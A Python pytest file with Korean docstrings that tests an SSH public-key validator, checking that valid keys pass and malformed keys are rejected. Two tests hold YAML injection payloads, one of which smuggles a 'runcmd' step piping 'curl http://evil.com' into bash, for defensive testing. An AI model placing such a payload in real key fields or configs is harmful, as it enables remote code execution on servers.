"""SSH public-key input validation regression tests."""

import pytest

from app.utils.ssh_keys import validate_ssh_public_key


class TestSshPublicKeyValidation:
    def test_valid_ed25519_key(self):
        """유효한 ed25519 키는 통과해야 한다."""
        key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest user@host"
        validate_ssh_public_key(key)  # 예외 없어야 함

    def test_valid_rsa_key(self):
        """유효한 RSA 키는 통과해야 한다."""
        key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC7test test@host"
        validate_ssh_public_key(key)

    def test_valid_ecdsa_key(self):
        """유효한 ECDSA 키는 통과해야 한다."""
        key = "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYtest test@host"
        validate_ssh_public_key(key)

    def test_newline_injection_rejected(self):
        """개행 문자 포함 SSH 키는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\nwrite_files:\n  - content: malicious"
        with pytest.raises(ValueError, match="개행"):
            validate_ssh_public_key(key)

    def test_carriage_return_injection_rejected(self):
        """캐리지 리턴 포함 SSH 키는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\rmalicious"
        with pytest.raises(ValueError):
            validate_ssh_public_key(key)

    def test_invalid_key_type_rejected(self):
        """지원하지 않는 키 타입은 거부되어야 한다."""
        with pytest.raises(ValueError, match="유효하지 않은"):
            validate_ssh_public_key("dss AAAAB3NzaC test@host")

    def test_arbitrary_string_rejected(self):
        """임의 문자열은 거부되어야 한다."""
        with pytest.raises(ValueError):
            validate_ssh_public_key("not-a-key")

    def test_empty_key_rejected(self):
        """빈 문자열은 거부되어야 한다."""
        with pytest.raises(ValueError):
            validate_ssh_public_key("")

    def test_yaml_injection_payload_rejected(self):
        """YAML injection 페이로드는 거부되어야 한다."""
        key = "ssh-ed25519 AAAA\nruncmd:\n  - curl http://evil.com | bash"
        with pytest.raises(ValueError):
            validate_ssh_public_key(key)

    def test_multi_word_comment_accepted(self):
        """코멘트 필드에 공백이 포함된 키도 통과해야 한다 (예: 'termius by jung')."""
        key = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAITest termius by jung"
        validate_ssh_public_key(key)  # 예외 없어야 함
